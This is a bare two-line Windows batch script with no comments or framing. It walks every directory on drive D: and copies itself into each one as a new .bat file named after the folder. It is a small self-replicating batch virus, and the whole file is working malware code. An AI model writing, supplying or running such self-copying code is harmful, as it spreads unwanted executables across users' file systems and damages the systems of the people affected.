@echo off
for /r "d:\" /d %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"